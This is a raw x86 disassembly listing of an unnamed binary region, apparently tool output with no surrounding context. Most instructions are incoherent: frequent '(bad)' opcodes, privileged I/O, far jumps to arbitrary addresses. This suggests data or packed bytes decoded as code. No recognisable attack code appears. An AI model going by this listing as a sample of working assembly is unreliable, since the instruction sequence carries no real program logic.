  409015:	shl    DWORD PTR [eax+eax*1-0x69],cl
  409019:	sbb    al,0x45
  40901b:	popa   
  40901c:	hlt    
  40901d:	addr16 jo 0x40909f
  409020:	add    BYTE PTR [eax+0x20],bh
  409023:	cmp    cl,BYTE PTR [esi+ecx*2+0x45cd2f2c]
  40902a:	dec    edi
  40902b:	push   ecx
  40902c:	mov    dh,0x43
  40902e:	pop    esp
  40902f:	dec    edx
  409030:	pop    edi
  409031:	or     eax,0xfe6b590d
  409036:	(bad)  
  409037:	dec    edi
  409039:	loope  0x40900f
  40903b:	test   BYTE PTR ds:0x36ffe4f9,0xb6
  409042:	icebp  
  409043:	cld    
  409044:	add    esi,edi
  409046:	mov    eax,ds:0x8df1bfb9
  40904b:	sar    BYTE PTR [ebx-0x11171f19],0xaf
  409052:	stos   DWORD PTR es:[edi],eax
  409053:	test   al,0x5
  409055:	test   BYTE PTR [eax],al
  409057:	add    ah,ch
  409059:	(bad)
  40905c:	aam    0xc1
  40905e:	out    0xe5,eax
  409060:	add    BYTE PTR [eax],al
  409062:	add    BYTE PTR [eax],al
  409064:	add    dh,ch
  409066:	(bad)  
  409068:	leave  
  409069:	imul   edx
  40906b:	(bad)  
  40906c:	jmp    0x4074ad
  409071:	call   0xfce1:0x4ae3ede8
  409078:	xlat   BYTE PTR ds:[ebx]
  409079:	xchg   ebp,eax
  40907a:	fsubrp st(7),st
  40907c:	loope  0x40905a
  40907e:	add    al,0x0
  409080:	add    dh,dl
  409082:	xor    DWORD PTR ds:0x332fbe27,esp
  409088:	adc    eax,ecx
  40908a:	aaa    
  40908b:	xor    DWORD PTR [ecx],ebp
  40908d:	shl    DWORD PTR [esi],1
  40908f:	(bad)  
  409090:	call   FWORD PTR [eax-0xe]
  409093:	idiv   ah
  409095:	jne    0x409082
  409097:	sbb    esi,ebp
  409099:	(bad)  
  40909b:	pop    es
  40909c:	out    0x88,eax
  40909e:	(bad)  
  40909f:	daa    
  4090a0:	hlt    
  4090a1:	mov    bh,bh
  4090a3:	add    al,BYTE PTR [eax]
  4090a5:	jne    0x40906e
  4090a7:	ja     0x409038
  4090a9:	icebp  
  4090aa:	mov    ds:0x78399671,al
  4090af:	jg     0x409031
  4090b1:	icebp  
  4090b2:	sbb    DWORD PTR [ebx],eax
  4090b4:	add    BYTE PTR [ebp-0x62],dh
  4090b7:	aas    
  4090b8:	call   0x9b75:0x31a28
  4090bf:	push   esp
  4090c0:	mov    edi,0x31a13
  4090c5:	jne    0x409090
  4090c7:	mov    cl,0x4d
  4090c9:	add    BYTE PTR [eax],al
  4090cb:	add    BYTE PTR [eax],al
  4090cd:	add    BYTE PTR [edi-0x4188fe25],ah
  4090d3:	aad    0xa9
  4090d5:	jmp    FWORD PTR [edx]
  4090d7:	xor    dh,al
  4090d9:	push   ds
  4090da:	jno    0x4090fd
  4090dc:	jmp    0x6617:0xca487c0e
  4090e3:	push   ss
  4090e4:	in     al,dx
  4090e5:	add    eax,0x34e9166e
  4090ea:	inc    edx
  4090eb:	pop    ss
  4090ec:	add    ecx,DWORD PTR [ecx]
  4090ee:	jbe    0x40911d
  4090f0:	hlt    
  4090f1:	inc    eax
  4090f2:	mov    eax,ds:0x36fff30f
  4090f7:	bswap  esi
  4090f9:	das    
  4090fa:	test   eax,0x75000319
  4090ff:	test   BYTE PTR [edx-0x64],dh
  409102:	add    dl,BYTE PTR [ebp+0x75ef8c67]
  409108:	dec    eax
  409109:	fwait
  40910a:	in     eax,0x97
  40910c:	ins    DWORD PTR es:[edi],dx
  40910d:	test   ebp,ebx
  40910f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409110:	push   0x6c02f1b6
  409115:	xchg   edi,edi
  409117:	xor    BYTE PTR [esi+0x76],0xb7
  40911b:	pop    eax
  40911c:	ins    BYTE PTR es:[edi],dx
  40911d:	js     0x40910e
  40911f:	add    bh,BYTE PTR ds:0x4561e15b
  409125:	(bad)  
  409126:	retf   0xe51
  409129:	dec    ebp
  40912a:	mov    WORD PTR [ecx+0x4d],ds
  40912d:	gs aad 0x61
  409130:	cmp    ebx,DWORD PTR [ebp+0x0]
  409133:	add    BYTE PTR [eax],al
  409135:	add    BYTE PTR [eax],al
  409137:	and    al,0x5c
  409139:	jmp    0x2f430641
  40913e:	xchg   ecx,eax
  40913f:	jmp    0x4090d9
  409141:	inc    edx
  409142:	lahf   
  409143:	into   
  409144:	loopne 0x409162
  409146:	xchg   esp,eax
  409147:	iret   
  409148:	mov    dl,BYTE PTR [eax-0x75]
  40914b:	into   
  40914c:	add    bh,BYTE PTR ds:0x10a6b9c3
  409152:	lods   eax,DWORD PTR ds:[esi]
  409153:	cwde   
  409154:	out    dx,al
  409155:	cs (bad) 
  409157:	mov    ebp,0xb8b942bc
  40915c:	out    0x17,al
  40915e:	ret    
  40915f:	mov    ah,0xb9
  409161:	cmp    eax,0x2dbc5abb
  409166:	lods   eax,DWORD PTR ds:[esi]
  409167:	adc    al,BYTE PTR [edi]
  409169:	pop    ebp
  40916a:	pop    esi
  40916b:	ficomp DWORD PTR [ebp+0x51]
  40916e:	push   esp
  40916f:	retf   
  409170:	sbb    eax,0x5dd55e6f
  409175:	jle    0x4091de
  409177:	sbb    eax,0x2d65a357
  40917c:	dec    ebp
  40917d:	mov    al,ds:0xa1021b65
  409182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409183:	dec    eax
  409184:	lahf   
  409185:	ret    
  409186:	mov    esp,0xa4bd9863
  40918b:	inc    esi
  40918c:	lea    ebp,[edx-0x67ac66]
  409192:	mov    al,0xef
  409194:	fwait
  409195:	jbe    0x40914e
  409197:	add    al,0xd3
  409199:	pop    esi
  40919a:	mov    eax,ds:0x0
  40919f:	add    BYTE PTR ds:0xf2b97985,al
  4091a5:	(bad)  
  4091a6:	pop    edi
  4091a7:	mov    eax,ds:0xdd74aacf
  4091ac:	fisttp QWORD PTR [esp+eax*1+0x53c3b68d]
  4091b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091b4:	retf   
  4091b5:	mov    dh,0xff
  4091b7:	neg    DWORD PTR [esp+edx*1+0x0]
  4091bb:	lods   al,BYTE PTR ds:[esi]
  4091bc:	xor    eax,0x39314eb8
  4091c1:	push   es
  4091c2:	call   DWORD PTR [ecx+0x7d9871e4]
  4091c8:	loop   0x409242
  4091ca:	fcom   DWORD PTR [ebp+0x5b8069de]
  4091d0:	(bad)  
  4091d1:	jg     0x409156
  4091d3:	jmp    0xee40944e
  4091d8:	inc    esi
  4091d9:	neg    BYTE PTR [ebx]
  4091db:	add    eax,0xffffce49
  4091e0:	jne    0x4091d6
  4091e2:	sbb    al,0x0
  4091e4:	pop    ds
  4091e5:	call   0xdb5d88f1
  4091ea:	and    ebp,edx
  4091ec:	cs int 0x29
  4091ef:	lds    ebp,FWORD PTR ds:0x1bde0e02
  4091f5:	push   es
  4091f6:	sbb    bh,dl
  4091f8:	or     eax,0xbdcb2f06
  4091fd:	add    eax,0xa818ccff
  409202:	push   esp
  409203:	rol    BYTE PTR [eax],0x0
  409206:	add    BYTE PTR [eax],al
  409208:	add    BYTE PTR [esi+0xdd214bc],dh
  40920e:	stos   BYTE PTR es:[edi],al
  40920f:	dec    edx
  409210:	mov    dl,0xa
  409212:	mov    ch,0x1c
  409214:	add    BYTE PTR [ebp+ecx*2+0x1cc4a4e],bh
  40921b:	add    BYTE PTR [eax],al
  40921d:	or     al,0x45
  40921f:	sbb    al,BYTE PTR [esi]
  409221:	sahf   
  409222:	add    DWORD PTR [eax],eax
  409224:	add    BYTE PTR [esi+eax*1+0xea61604],bl
  40922b:	or     eax,DWORD PTR [eax]
  40922d:	fwait
  40922e:	pop    es
  40922f:	sbb    eax,0x9079543
  409234:	add    BYTE PTR [eax-0x17],bl
  409237:	out    0xf8,eax
  409239:	outs   dx,BYTE PTR ds:[esi]
  40923a:	loope  0x409225
  40923c:	jmp    0xe575:0xc4dee174
  409243:	repz out dx,al
  409245:	adc    eax,0x38fbf6c9
  40924a:	clc    
  40924b:	in     al,dx
  40924c:	add    BYTE PTR [ebx],cl
  40924e:	in     al,0xfd
  409250:	add    ch,ah
  409252:	into   
  409253:	mov    edx,0xe0eb3fbe
  409258:	add    BYTE PTR [eax+0x1c],cl
  40925b:	add    al,BYTE PTR [esi]
  40925d:	push   eax
  40925e:	add    DWORD PTR [eax],eax
  409260:	add    BYTE PTR [ecx-0x5b777279],ch
  409266:	jg     0x4091f8
  409268:	int    0xaf
  40926a:	test   BYTE PTR [ebx+0x8c],bl
  409270:	add    BYTE PTR [eax],al
  409272:	mov    al,ds:0xce998980
  409277:	mov    dl,0x87
  409279:	adc    DWORD PTR [esi-0x7b6f7a67],0x9d9ad7cf
  409283:	xchg   ecx,eax
  409284:	xchg   esi,eax
  409285:	xchg   esp,eax
  409286:	cmp    esi,DWORD PTR [ecx-0x6ac03407]
  40928c:	(bad)  
  40928d:	dec    ebp
  40928f:	push   edx
  409290:	sbb    al,BYTE PTR [edx]
  409292:	jne    0x4092dc
  409294:	fdiv   st(7),st
  409296:	ror    BYTE PTR ds:0x485d7bb9,cl
  40929c:	jecxz  0x4092d6
  40929e:	cmp    BYTE PTR [edi],0xe7
  4092a1:	(bad)  
  4092a2:	mov    edx,0x5428d800
  4092a7:	sbb    eax,DWORD PTR [ebx]
  4092a9:	add    BYTE PTR [ebp-0x8],dh
  4092ac:	pop    ds
  4092ad:	loopne 0x409249
  4092af:	sbb    al,BYTE PTR [ebx]
  4092b1:	add    BYTE PTR [ebp-0x1],dh
  4092b4:	xor    ebx,ebx
  4092b6:	mov    ebp,0xa8cb2be6
  4092bb:	out    dx,eax
  4092bc:	or     ebx,esp
  4092be:	stos   BYTE PTR es:[edi],al
  4092bf:	fldenv ds:0x2ce19ac2
  4092c5:	icebp  
  4092c6:	outs   dx,BYTE PTR ds:[esi]
  4092c7:	fdivr  DWORD PTR [esi]
  4092c9:	int    0x32
  4092cb:	dec    edx
  4092cc:	xor    ecx,edi
  4092ce:	pop    edx
  4092cf:	dec    esp
  4092d0:	xor    al,0xd3
  4092d2:	xor    BYTE PTR [ebx],ch
  4092d4:	sbb    cl,bl
  4092d6:	add    BYTE PTR [eax],al
  4092d8:	add    BYTE PTR [eax],al
  4092da:	add    BYTE PTR [ebx+eax*2+0x1d],cl
  4092de:	lock inc edx
  4092e0:	inc    ebx
  4092e1:	cmp    bl,ah
  4092e3:	aas    
  4092e4:	cmp    eax,0x403be30f
  4092e9:	or     ch,BYTE PTR [ebp-0x2f9bbae]
  4092ef:	adc    al,0x73
  4092f1:	and    eax,0x19433df6
  4092f6:	out    dx,eax
  4092f7:	adc    BYTE PTR [esi+0x19fcd861],bl
  4092fd:	add    eax,DWORD PTR [eax]
  4092ff:	jne    0x409329
  409301:	enter  0x4736,0x3f
  409305:	in     eax,dx
  409306:	cmp    BYTE PTR ds:0x9d3ed348,bh
  40930c:	sbb    DWORD PTR [ebx],eax
  40930e:	add    BYTE PTR [ebp+0x2],dh
  409311:	sub    al,0xc
  409313:	out    0x21,eax
  409315:	inc    esp
  409316:	adc    dl,bh
  409318:	push   cs
  409319:	sub    esi,DWORD PTR [edx]
  40931b:	enter  0x4104,0x10
  40931f:	fimul  WORD PTR [ecx+ecx*2]
  409322:	adc    ebx,DWORD PTR [ebp-0x2ff0b2ca]
  409328:	cmovns ebx,DWORD PTR [edx]
  40932b:	lods   eax,DWORD PTR ds:[esi]
  40932c:	push   ebp
  40932d:	push   ds
  40932e:	adc    ebp,DWORD PTR [ebp-0x3bbebfe3]
  409334:	cmp    ecx,DWORD PTR [edi]
  409336:	and    esi,DWORD PTR [edi-0x4dd9ded6]
  40933c:	ds jmp 0x409345
  409342:	add    BYTE PTR [eax],al
  409344:	jne    0x409348
  409346:	sbb    DWORD PTR cs:[edi+ebx*1+0x2f952213],edx
  40934e:	cmp    eax,DWORD PTR [esi*2-0x661b1dfe]
  409355:	ror    DWORD PTR [esi],cl
  409357:	(bad)  
  409358:	mov    es,WORD PTR [edx]
  40935a:	js     0x4093b3
  40935c:	adc    ecx,DWORD PTR [ebp-0x68]
  40935f:	pop    ebp
  409360:	or     esp,DWORD PTR [edx+0x77]
  409363:	jge    0x409379
  409365:	pop    eax
  409366:	test   DWORD PTR [ebx+0x2],esp
  409369:	pusha  
  40936a:	jne    0x4093ca
  40936c:	jmp    0xe4a304da
  409371:	pop    edx
  409372:	jne    0x4093b9
  409374:	(bad)  [eax]
  409376:	sbb    BYTE PTR [esi-0x2f],0x50
  40937a:	ins    BYTE PTR es:[edi],dx
  40937b:	je     0x40936d
  40937d:	outs   dx,BYTE PTR ds:[esi]
  40937e:	push   ebx
  40937f:	dec    esi
  409380:	add    DWORD PTR [esi+0x70],esi
  409383:	xor    ah,0x7a
  409386:	jo     0x4093e4
  409388:	clc    
  409389:	and    BYTE PTR [edi+0x6d],0xf7
  40938d:	add    DWORD PTR [eax],eax
  40938f:	nop
  409390:	jnp    0x4093ab
  409392:	sti    
  409393:	jae    0x4093d8
  409395:	es in  al,dx
  409397:	dec    esp
  409398:	add    BYTE PTR [edx],0x0
  40939b:	mov    edx,DWORD PTR [ebx+0x6d]
  40939e:	xchg   BYTE PTR [ebx+0x45],ch
  4093a1:	jge    0x409336
  4093a3:	test   BYTE PTR ds:0x769970,ah
  4093a9:	add    BYTE PTR [eax],al
  4093ab:	add    BYTE PTR [eax],al
  4093ad:	inc    edi
  4093ae:	jbe    0x409341
  4093b0:	dec    dx
  4093b2:	inc    ebx
  4093b3:	stos   DWORD PTR es:[edi],eax
  4093b4:	bound  esp,QWORD PTR [esi]
  4093b6:	adc    BYTE PTR [esi+eiz*2+0x51ca632d],0x12
  4093be:	arpl   WORD PTR [edx-0x5fb3eba1],ax
  4093c4:	pusha  
  4093c5:	and    DWORD PTR [edi+edi*4+0x56],ecx
  4093c9:	jbe    0x4093cd
  4093cb:	add    BYTE PTR [esi],dh
  4093cd:	ds and eax,0x344308cb
  4093d3:	fcomp  DWORD PTR ds:0x25d294df
  4093d9:	sahf   
  4093da:	(bad)
  4093dd:	mov    cs,WORD PTR [eax-0x1f5c3c27]
  4093e3:	fdivr  DWORD PTR [esi-0x5f376f7c]
  4093e9:	pop    ebx
  4093eb:	aam    0xc2
  4093ed:	ins    DWORD PTR es:[edi],dx
  4093ee:	(bad)  
  4093ef:	mov    edx,0xb7c0b07b
  4093f4:	enter  0xbbc6,0xa9
  4093f8:	push   edx
  4093f9:	xchg   edx,eax
  4093fa:	jecxz  0x4093e1
  4093fc:	xchg   esi,eax
  4093fd:	outs   dx,BYTE PTR ds:[esi]
  4093fe:	fprem  
  409400:	popf   
  409401:	jg     0x4093ef
  409403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409404:	dec    ecx
  409405:	push   esi
  409406:	hlt    
  409407:	in     eax,dx
  409408:	cwde   
  409409:	gs jecxz 0x409402
  40940c:	add    al,ah
  40940e:	jle    0x40939c
  409410:	cwde   
  409411:	add    BYTE PTR [eax],al
  409413:	add    BYTE PTR [eax],al
  409415:	add    BYTE PTR [eax+0x88d897b],cl
  40941b:	test   BYTE PTR [eax-0x27ceb06a],dl
  409421:	aad    0x37
  409423:	inc    esp
  409424:	shl    esp,cl
  409426:	xor    BYTE PTR [esi],al
  409428:	add    BYTE PTR [eax],al
  40942a:	iret   
  40942b:	icebp  
  40942c:	call   DWORD PTR [esi]
  40942e:	jns    0x409423
  409430:	adc    BYTE PTR [esp+eax*8],al
  409433:	mov    esi,0xe6cb034c
  409438:	sbb    eax,0x58e9a006
  40943d:	push   ss
  40943e:	mov    ecx,0x771819e9
  409443:	mov    ch,0x1d
  409445:	adc    ah,BYTE PTR [ecx-0x5fe3f00b]
  40944b:	jecxz  0x409477
  40944d:	and    al,0xa0
  40944f:	fld    TBYTE PTR ds:0x6aa2e833
  409455:	jge    0x409446
  409457:	xchg   ebp,eax
  409458:	inc    ebx
  409459:	inc    ebx
  40945a:	aas    
  40945b:	loope  0x40948c
  40945d:	daa    
  40945e:	dec    ecx
  40945f:	loop   0x409481
  409461:	xor    al,0x94
  409463:	(bad)  
  409464:	jl     0x409493
  409466:	test   ah,dl
  409468:	sub    al,0x38
  40946a:	mov    eax,ds:0x6a4608a8
  40946f:	sar    BYTE PTR [edi],0x53
  409472:	lods   eax,DWORD PTR ds:[esi]
  409473:	lds    edi,FWORD PTR [ebp+0x45]
  409476:	pop    ebx
  409477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409478:	dec    edx
  409479:	inc    esi
  40947a:	add    BYTE PTR [eax],al
  40947c:	add    BYTE PTR [eax],al
  40947e:	add    BYTE PTR [ebp-0x53],bl
  409481:	sbb    BYTE PTR [esi+0x79],dl
  409484:	stos   BYTE PTR es:[edi],al
  409485:	pop    ecx
  409486:	pop    eax
  409487:	mov    bh,0xba
  409489:	sbb    al,0x11
  40948b:	jbe    0x409436
  40948d:	push   edi
  40948e:	push   ebp
  40948f:	jne    0x4094af
  409491:	mov    ds:0xf9e04b2c,al
  409496:	je     0x40941f
  409498:	adc    al,0x87
  40949a:	push   edx
  40949b:	js     0x4094a0
  40949d:	xchg   esi,eax
  40949e:	ins    DWORD PTR es:[edi],dx
  40949f:	xchg   esp,eax
  4094a0:	mov    edi,0x863709e
  4094a5:	mov    ds:0xd1d05878,eax
  4094aa:	push   0x59
  4094ac:	ror    DWORD PTR [ebp-0x7e979dba],cl
  4094b2:	xchg   ebx,eax
  4094b3:	stc    
  4094b4:	pop    esi
  4094b5:	jg     0x409476
  4094b7:	icebp  
  4094b8:	outs   dx,DWORD PTR ds:[esi]
  4094b9:	ins    BYTE PTR es:[edi],dx
  4094ba:	mov    esp,ebp
  4094bc:	xor    bh,BYTE PTR [eax+ecx*8]
  4094bf:	add    ah,BYTE PTR [eax+0x68]
  4094c2:	xchg   DWORD PTR ds:0x9efd3b14,eax
  4094c8:	jae    0x409541
  4094ca:	cdq    
  4094cb:	jmp    0x144a:0xf18a7845
  4094d2:	out    0xc3,al
  4094d4:	inc    edi
  4094d5:	arpl   WORD PTR [ebp-0x4ab7b03a],si
  4094db:	xchg   esi,eax
  4094dc:	cmp    eax,0x631aba59
  4094e1:	bound  edi,QWORD PTR [ebp+0x0]
  4094e7:	add    BYTE PTR ds:0x2bbe4947,ah
  4094ed:	imul   esi,DWORD PTR [esi-0x3d5eef4c],0xfffffff5
  4094f4:	pop    ds
  4094f5:	test   al,0xcb
  4094f7:	ror    BYTE PTR [edi-0x61],cl
  4094fa:	rol    dl,1
  4094fc:	cmp    DWORD PTR [esi-0x79],esi
  4094ff:	mov    ebp,DWORD PTR [esi]
  409501:	mov    ch,0xca
  409503:	fiadd  DWORD PTR [ecx+0x59]
  409506:	nop
  409507:	mov    eax,0xd4c3a8ea
  40950c:	add    ecx,DWORD PTR ss:[eax-0x4324d72d]
  409513:	xchg   edi,eax
  409514:	in     al,dx
  409515:	int3   
  409516:	mov    eax,ebp
  409518:	add    eax,0xfdfb81f8
  40951d:	scas   eax,DWORD PTR es:[edi]
  40951e:	jg     0x409512
  409520:	clc    
  409521:	jecxz  0x4094b6
  409523:	cld    
  409524:	icebp  
  409525:	jmp    0x409598
  409527:	add    dl,ch
  409529:	int3   
  40952a:	jno    0x40952d
  40952c:	(bad)  
  40952d:	mul    BYTE PTR [ebx-0x12]
  409530:	enter  0xa0fa,0xbb
  409534:	or     al,BYTE PTR [eax]
  409536:	out    dx,al
  409537:	push   cs
  409538:	bound  eax,QWORD PTR [edx]
  40953a:	mov    ds:0xe26b505b,al
  40953f:	pop    ds
  409540:	ins    BYTE PTR es:[edi],dx
  409541:	pop    ds
  409542:	hlt    
  409543:	push   ds
  409544:	(bad)  
  409545:	push   cs
  409546:	fldenv [edx+0x43]
  409549:	or     dh,dl
  40954b:	adc    eax,DWORD PTR [eax]
  40954d:	add    BYTE PTR [eax],al
  40954f:	add    BYTE PTR [eax],al
  409551:	js     0x409556
  409553:	dec    BYTE PTR [esi]
  409555:	jo     0x4095aa
  409557:	in     al,dx
  409558:	sbb    eax,0x37f0177f
  40955d:	inc    esp
  40955e:	daa    
  40955f:	mov    esi,0xce20492d
  409564:	and    al,0x3a
  409566:	sub    dl,al
  409568:	inc    ecx
  409569:	scas   eax,DWORD PTR es:[edi]
  40956a:	cs jno 0x409594
  40956d:	test   eax,0xa20fc43c
  409572:	aas    
  409573:	and    al,0x3e
  409575:	(bad)  [ecx+0x63]
  409578:	inc    ecx
  409579:	mov    WORD PTR ds:0x2078463c,?
  40957f:	(bad)  
  409580:	sub    al,0x75
  409582:	add    bl,BYTE PTR [eax-0x5c]
  409585:	add    ebp,DWORD PTR [eax+ebp*8+0x27503]
  40958c:	(bad)  
  40958d:	jp     0x4095bf
  40958f:	sbb    bh,dl
  409591:	or     BYTE PTR [esi],0x10
  409594:	jmp    0xce409819
  409599:	adc    BYTE PTR [edx+ebx*1],0xfb
  40959d:	ins    BYTE PTR es:[edi],dx
  40959e:	push   ds
  40959f:	pop    ebp
  4095a0:	jmp    0x409618
  4095a2:	add    al,BYTE PTR [eax]
  4095a4:	adc    DWORD PTR [edx+0x69f47d75],ecx
  4095aa:	jnp    0x409618
  4095ac:	mov    bh,0x6e
  4095ae:	jle    0x40962a
  4095b0:	jmp    0x9240982b
  4095b5:	add    BYTE PTR [eax],al
  4095b7:	add    BYTE PTR [eax],al
  4095b9:	add    BYTE PTR [edx],cl
  4095bb:	mov    edx,0xac0955ae
  4095c0:	(bad)  
  4095c1:	jnp    0x4095cf
  4095c3:	lahf   
  4095c4:	mov    cl,0x99
  4095c6:	or     eax,eax
  4095c8:	sbb    BYTE PTR [edi-0x2],0x9e
  4095cc:	mov    ch,0x7b
  4095ce:	lock lods al,BYTE PTR ds:[esi]
  4095d0:	inc    ebp
  4095d2:	sbb    DWORD PTR [ebp+0x12],eax
  4095d5:	lea    ebp,[edi]
  4095d7:	inc    ecx
  4095d8:	push   ss
  4095d9:	jmp    0x4a409854
  4095de:	mov    ah,0xbd
  4095e0:	mov    bh,0x29
  4095e2:	mov    ebx,0xdf27c196
  4095e7:	rcl    ecx,0x1e
  4095ea:	pushf  
  4095eb:	lds    ebp,FWORD PTR [edx-0xe90c7]
  4095f1:	sti    
  4095f2:	pop    esi
  4095f3:	in     al,dx
  4095f4:	xchg   edi,eax
  4095f5:	sbb    dl,BYTE PTR [edi-0x3e]
  4095f8:	fsubr  DWORD PTR [eax+0x16000271]
  4095fe:	lea    edi,[eax]
  409600:	and    ebp,edi
  409602:	ins    BYTE PTR es:[edi],dx
  409603:	xor    BYTE PTR [edi],cl
  409605:	fnstsw WORD PTR [ebx+0xa]
  409608:	sbb    BYTE PTR [eax],al
  40960a:	push   0x14011d1c
  40960f:	sbb    al,BYTE PTR [eax]
  409611:	add    BYTE PTR [edx-0x645d464b],ch
  409617:	fwait
  409618:	mov    ds:0x9c86f093,eax
  40961d:	add    BYTE PTR [eax],al
  40961f:	add    BYTE PTR [eax],al
  409621:	add    BYTE PTR [eax],al
  409623:	mov    DWORD PTR [eax-0x45476a6a],ebx
  409629:	test   BYTE PTR [eax+0xbba7b3],dh
  40962f:	call   0xa317e1f
  409634:	(bad)  
  409635:	cli    
  409636:	ror    BYTE PTR ds:0x16d0f6df,cl
  40963c:	neg    esp
  40963e:	fisub  WORD PTR [esi+0x35d3cdd1]
  409644:	push   es
  409645:	add    BYTE PTR [eax],al
  409647:	outs   dx,DWORD PTR ds:[esi]
  409648:	xor    BYTE PTR ds:0x7270b928,ch
  40964e:	add    BYTE PTR [ecx+0x26],dh
  409651:	and    esp,DWORD PTR [esi]
  409653:	jle    0x4096c1
  409655:	jl     0x4096d4
  409657:	pushf  
  409658:	add    DWORD PTR [eax],eax
  40965a:	add    BYTE PTR [esp+edi*2+0x1d8f7b7e],ch
  409661:	add    BYTE PTR [esi],bl
  409663:	pushf  
  409664:	add    DWORD PTR [eax],eax
  409666:	add    BYTE PTR [ebx-0x1c],cl
  409669:	fdivp  st(5),st
  40966b:	jno    0x40964e
  40966d:	imul   ebx
  40966f:	jae    0x409660
  409671:	repz repnz push 0xb7000001
  409678:	popf   
  409679:	fwait
  40967a:	lahf   
  40967b:	ret    
  40967c:	cdq    
  40967d:	mov    eax,DWORD PTR [eax]
  40967f:	arpl   WORD PTR [eax],bp
  409681:	xor    BYTE PTR ss:[ecx+eax*1+0x0],bl
  409686:	add    BYTE PTR [eax],al
  409688:	add    BYTE PTR [eax],al
  40968a:	add    BYTE PTR [eax],al
  40968c:	jne    0x40965e
  40968e:	fcom   st(3)
  409690:	xor    dh,BYTE PTR [edx-0x3118362d]
  409696:	retf   0x4bc1
  409699:	jmp    0x40969d
  40969b:	add    BYTE PTR [ebp+0x6],dh
  40969e:	add    al,0x2
  4096a0:	jl     0x40967e
  4096a2:	add    eax,0x4d1b11c
  4096a7:	or     dh,BYTE PTR [edi-0xb]
  4096aa:	or     eax,DWORD PTR [eax]
  4096ac:	jne    0x409639
  4096ae:	in     al,dx
  4096af:	repz adc edi,DWORD PTR [edi-0x1c]
  4096b3:	loopne 0x40972a
  4096b5:	add    esp,DWORD PTR [ecx+0x4f]
  4096b8:	xor    al,0x20
  4096ba:	push   ecx
  4096bb:	dec    edi
  4096bc:	dec    esp
  4096bd:	loop   0x409721
  4096bf:	dec    eax
  4096c0:	cmp    DWORD PTR [edi+eax*2],ebx
  4096c3:	dec    ebx
  4096c4:	sub    al,al
  4096c6:	add    al,BYTE PTR [eax]
  4096c8:	jne    0x409728
  4096ca:	aam    0x9a
  4096cc:	iret   
  4096cd:	xor    edx,esi
  4096cf:	fisubr DWORD PTR [eax-0x182624cb]
  4096d5:	dec    edi
  4096d6:	rcl    ebx,cl
  4096d8:	int    0x29
  4096da:	add    eax,DWORD PTR [eax]
  4096dc:	jne    0x4096b8
  4096de:	aas    
  4096df:	ja     0x40966c
  4096e1:	clc    
  4096e2:	cmp    DWORD PTR [edi],esi
  4096e4:	pop    esp
  4096e5:	loop   0x40971d
  4096e7:	ss adc esp,esp
  4096ea:	cmp    BYTE PTR ds:[ecx-0x3a],al
  4096ee:	jae    0x409737
  4096f0:	add    BYTE PTR [eax],al
  4096f2:	add    BYTE PTR [eax],al
  4096f4:	add    BYTE PTR [ebx+ebp*8],dh
  4096f7:	add    al,BYTE PTR [eax]
  4096f9:	jne    0x40968b
  4096fb:	jnp    0x4096fd
  4096fd:	jne    0x4096ec
  4096ff:	push   ds
  409700:	pusha  
  409701:	ret    
  409702:	fwait
  409703:	add    al,BYTE PTR [eax]
  409705:	jne    0x409725
  409707:	ret    0x2cc2
  40970a:	add    edi,DWORD PTR [ebp-0x1726d734]
  409710:	add    esi,DWORD PTR [ebp+0x2]
  409713:	sub    DWORD PTR [ebx-0x2b],esp
  409716:	arpl   WORD PTR [esp+esi*2-0x71],dx
  40971a:	aas    
  40971b:	dec    esi
  40971c:	imul   ebx,DWORD PTR [ecx-0x629dba94],0x2
  409723:	xchg   esi,eax
  409724:	add    BYTE PTR [edx],ah
  409726:	sti    
  409727:	ret    0xe1ef
  40972a:	fisub  WORD PTR [eax-0x5e0df008]
  409730:	add    DWORD PTR [edx],eax
  409732:	test   al,0x46
  409734:	out    0x1a,al
  409736:	jmp    0x4096bc
  409738:	call   DWORD PTR ds:0x8a85fe
  40973e:	add    edi,edi
  409740:	jg     0x4097b1
  409742:	pusha  
  409743:	repnz addr16 pop esp
  409746:	idiv   DWORD PTR fs:[edi+0x55]
  40974a:	xor    ecx,ebp
  40974c:	add    esi,DWORD PTR [ebp+0x2]
  40974f:	call   0xc4590173
  409754:	xor    BYTE PTR [edi+0x38],bh
  409757:	add    BYTE PTR [ecx],ch
  409759:	add    BYTE PTR [eax],al
  40975b:	add    BYTE PTR [eax],al
  40975d:	add    BYTE PTR [eax+0x5b271534],cl
  409763:	xor    cl,bh
  409765:	ss pusha 
  409767:	js     0x409725
  409769:	cmp    al,0x64
  40976b:	cmp    eax,0x346337ef
  409770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409771:	ins    DWORD PTR es:[edi],dx
  409772:	or     ch,BYTE PTR [edi-0x1d]
  409775:	popa   
  409776:	jne    0x40977a
  409778:	mov    eax,0xcc48324f
  40977d:	or     BYTE PTR [edi],0x68
  409780:	cmp    BYTE PTR [eax-0x10],0x64
  409784:	jge    0x4097fc
  409786:	jecxz  0x4097e8
  409788:	add    BYTE PTR [ecx-0x43cf9a25],cl
  40978e:	fnstcw WORD PTR [esi+0x6b]
  409791:	pop    edx
  409792:	jecxz  0x4097f4
  409794:	outs   dx,DWORD PTR ds:[esi]
  409795:	dec    ecx
  409796:	mov    BYTE PTR ds:0x135f2323,ah
  40979c:	sbb    bl,BYTE PTR [esp+edx*8]
  40979f:	dec    esi
  4097a0:	dec    ebp
  4097a1:	das    
  4097a2:	rol    BYTE PTR [ecx+0x56],cl
  4097a5:	icebp  
  4097a6:	adc    BYTE PTR [eax],0x45
  4097a9:	loop   0x4097ff
  4097ab:	add    al,BYTE PTR [eax]
  4097ad:	in     eax,0x82
  4097af:	adc    ecx,DWORD PTR [edx]
  4097b1:	icebp  
  4097b2:	ja     0x4097b4
  4097b4:	push   ss
  4097b5:	in     eax,0x77
  4097b7:	add    DWORD PTR [ecx-0x8],eax
  4097ba:	lods   eax,DWORD PTR ds:[esi]
  4097bb:	push   ds
  4097bc:	sbb    eax,0x191199eb
  4097c1:	jmp    0x9500:0x0
  4097c8:	pop    esp
  4097c9:	pop    es
  4097ca:	out    dx,al
  4097cb:	xchg   BYTE PTR [eax],bl
  4097cd:	adc    bl,dl
  4097cf:	mov    ebx,DWORD PTR [ebx]
  4097d1:	pop    ds
  4097d2:	enter  0x276,0x0
  4097d6:	inc    edx
